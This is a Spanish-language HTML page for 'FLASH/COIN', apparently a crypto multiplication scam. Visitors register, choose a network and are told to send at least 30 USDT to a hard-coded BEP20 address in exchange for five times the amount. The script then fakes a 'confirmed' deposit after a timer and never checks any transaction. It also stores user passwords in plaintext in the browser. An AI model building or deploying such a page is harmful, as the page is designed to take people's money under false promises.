<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FLASH/COIN</title>

<style>

*{box-sizing:border-box;font-family:Arial}

body{
margin:0;
background:linear-gradient(135deg,#0f172a,#020617);
color:white;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.container{
width:95%;
max-width:420px;
background:#0f172a;
padding:25px;
border-radius:12px;
box-shadow:0 20px 60px rgba(0,0,0,0.7);
display:none;
position:relative;
}

.active{display:block;}

input{
width:100%;
padding:12px;
margin-top:10px;
border-radius:8px;
border:none;
background:#1e293b;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:8px;
background:linear-gradient(90deg,#22c55e,#4ade80);
font-weight:bold;
cursor:pointer;
}

.network{
background:#1e293b;
padding:15px;
border-radius:10px;
margin-top:10px;
cursor:pointer;
}

.selected{border:2px solid #4ade80;}

#toast{
position:fixed;
bottom:30px;
left:50%;
transform:translateX(-50%);
background:#111;
padding:14px 22px;
border-radius:8px;
opacity:0;
transition:.4s;
z-index:9999;
}

#toast.show{opacity:1;}

table{
width:100%;
margin-top:15px;
font-size:12px;
}

td{
border-bottom:1px solid #333;
padding:6px;
}

.warning{
font-size:12px;
color:#facc15;
margin-top:5px;
}

/* BOTON CERRAR SESION */

.logout{
position:absolute;
top:10px;
right:10px;
background:#ef4444;
border:none;
padding:6px 10px;
font-size:12px;
border-radius:6px;
cursor:pointer;
}

/* BOTON COPIAR */

.copyBtn{
margin-top:8px;
background:#3b82f6;
}

</style>
</head>

<body>

<div id="toast"></div>

<!-- REGISTRO -->

<div class="container active" id="register">

<h2>FLASH/COIN Registro</h2>

<input id="regUser" placeholder="Usuario">
<input id="regEmail" placeholder="Correo">
<input id="regPass" type="password" placeholder="Contraseña">
<input id="regPass2" type="password" placeholder="Confirmar contraseña">

<button id="registerBtn">Registrarse</button>

<p>¿Ya tienes cuenta?
<span id="goLogin" style="color:#4ade80;cursor:pointer">Iniciar sesión</span>
</p>

</div>

<!-- LOGIN -->

<div class="container" id="login">

<h2>FLASH/COIN Login</h2>

<input id="logUser" placeholder="Usuario">
<input id="logPass" type="password" placeholder="Contraseña">

<button id="loginBtn">Entrar</button>

<p>¿No tienes cuenta?
<span id="goRegister" style="color:#4ade80;cursor:pointer">Registrarse</span>
</p>

</div>

<!-- DASHBOARD -->

<div class="container" id="dashboard">

<button class="logout" onclick="logout()">Cerrar</button>

<h2>FLASH/COIN</h2>
<p id="welcome"></p>

<h3>Seleccionar red para recibir</h3>

<div class="network" data-net="TRC20">USDT TRC20</div>
<div class="network" data-net="BEP20">USDT BEP20</div>
<div class="network" data-net="BTC">Bitcoin</div>

<button id="confirmNet">Continuar</button>

</div>

<!-- DEPOSITO -->

<div class="container" id="deposit">

<button class="logout" onclick="logout()">Cerrar</button>

<h3 id="networkTitle"></h3>

<p>Dirección de depósito (USDT BEP20)</p>

<input id="depositAddress" readonly value="0x3670a0bFfb8b8A6D42177807F8dFd369A3995b9e">

<button class="copyBtn" onclick="copyAddress()">Copiar dirección</button>

<p class="warning">Enviar solo USDT BEP20</p>

<input id="wallet" placeholder="Dirección donde recibir">

<input id="amount" placeholder="Cantidad a depositar USDT">

<input id="receive" placeholder="Cantidad a recibir" readonly>

<input id="hash" placeholder="Hash de transacción BEP20">

<button id="depositBtn">Confirmar depósito</button>

<h3>Historial</h3>

<table id="history"></table>

</div>

<script>

const toastBox=document.getElementById("toast")

function toast(msg){
toastBox.innerText=msg
toastBox.classList.add("show")
setTimeout(()=>{toastBox.classList.remove("show")},3000)
}

/* COPIAR DIRECCION */

function copyAddress(){

let address=document.getElementById("depositAddress").value

navigator.clipboard.writeText(address)

toast("Dirección copiada")

}

/* LOGOUT */

function logout(){

localStorage.removeItem("session")

location.reload()

}

/* PANELES */

const registerBox=document.getElementById("register")
const loginBox=document.getElementById("login")
const dashboardBox=document.getElementById("dashboard")
const depositBox=document.getElementById("deposit")

function show(panel){

document.querySelectorAll(".container").forEach(x=>x.classList.remove("active"))

panel.classList.add("active")

}

/* CAMBIAR LOGIN REGISTRO */

goLogin.onclick=()=>show(loginBox)
goRegister.onclick=()=>show(registerBox)

/* REGISTRO */

registerBtn.onclick=()=>{

let u=regUser.value.trim()
let e=regEmail.value.trim()
let p=regPass.value
let p2=regPass2.value

if(!u||!e||!p){
toast("Complete todos los campos")
return
}

if(p!==p2){
toast("Las contraseñas no coinciden")
return
}

let users=JSON.parse(localStorage.getItem("users"))||[]

if(users.find(x=>x.user===u)){
toast("Usuario ya existe")
return
}

users.push({user:u,email:e,pass:p})

localStorage.setItem("users",JSON.stringify(users))
localStorage.setItem("session",u)

toast("Registro exitoso")

setTimeout(()=>showDashboard(u),1200)

}

/* LOGIN */

loginBtn.onclick=()=>{

let u=logUser.value
let p=logPass.value

let users=JSON.parse(localStorage.getItem("users"))||[]

let user=users.find(x=>x.user===u && x.pass===p)

if(!user){
toast("Datos incorrectos")
return
}

localStorage.setItem("session",u)

toast("Inicio de sesión correcto")

setTimeout(()=>showDashboard(u),1000)

}

/* DASHBOARD */

let selectedNetwork=null

document.querySelectorAll(".network").forEach(el=>{

el.onclick=function(){

document.querySelectorAll(".network").forEach(n=>n.classList.remove("selected"))

this.classList.add("selected")

selectedNetwork=this.dataset.net

}

})

confirmNet.onclick=()=>{

if(!selectedNetwork){
toast("Seleccione una red")
return
}

networkTitle.innerText="Recibir en red: "+selectedNetwork

show(depositBox)

}

/* VALIDACION WALLET */

function validWallet(wallet){

if(selectedNetwork==="TRC20"){
return /^T[a-zA-Z0-9]{33}$/.test(wallet)
}

if(selectedNetwork==="BEP20"){
return /^0x[a-fA-F0-9]{40}$/.test(wallet)
}

if(selectedNetwork==="BTC"){
return /^(bc1|1|3)[a-zA-Z0-9]{25,39}$/.test(wallet)
}

return false

}

/* CONVERSION */

amount.oninput=()=>{

let v=parseFloat(amount.value)

if(!v)return

if(v<30){
receive.value="mínimo 30"
return
}

if(selectedNetwork==="BTC"){
receive.value=(v/1000).toFixed(4)+" BTC"
}else{
receive.value=v*5+" USDT"
}

}

/* HASH VALIDACION */

function validHash(h){
return /^0x[a-fA-F0-9]{64}$/.test(h)
}

let usedHashes=JSON.parse(localStorage.getItem("hashes"))||[]

depositBtn.onclick=()=>{

let walletValue=wallet.value.trim()
let a=parseFloat(amount.value)
let h=hash.value.trim()

if(!walletValue){
toast("Ingrese dirección de recepción")
return
}

if(!validWallet(walletValue)){
toast("Wallet inválida para la red seleccionada")
return
}

if(a<30){
toast("Depósito mínimo 30 USDT")
return
}

if(!validHash(h)){
toast("Hash inválido")
return
}

if(usedHashes.includes(h)){
toast("Hash ya usado")
return
}

toast("Depósito en procesamiento")

usedHashes.push(h)
localStorage.setItem("hashes",JSON.stringify(usedHashes))

setTimeout(()=>{

toast("Depósito confirmado")

saveHistory(a,h)

},3000)

}

/* HISTORIAL */

let history=JSON.parse(localStorage.getItem("history"))||[]

function saveHistory(a,h){

let r

if(selectedNetwork==="BTC"){
r=(a/1000)+" BTC"
}else{
r=a*5+" USDT"
}

history.push({
net:selectedNetwork,
dep:a,
rec:r,
hash:h
})

localStorage.setItem("history",JSON.stringify(history))

loadHistory()

}

function loadHistory(){

historyTable.innerHTML=""

history.forEach(t=>{

historyTable.innerHTML+=`
<tr>
<td>${t.net}</td>
<td>${t.dep}</td>
<td>${t.rec}</td>
<td>${t.hash.slice(0,10)}...</td>
</tr>
`

})

}

const historyTable=document.getElementById("history")

function showDashboard(user){

welcome.innerText="Bienvenido "+user

show(dashboardBox)

}

let session=localStorage.getItem("session")

if(session){
showDashboard(session)
}

loadHistory()

</script>

</body>
  </html>
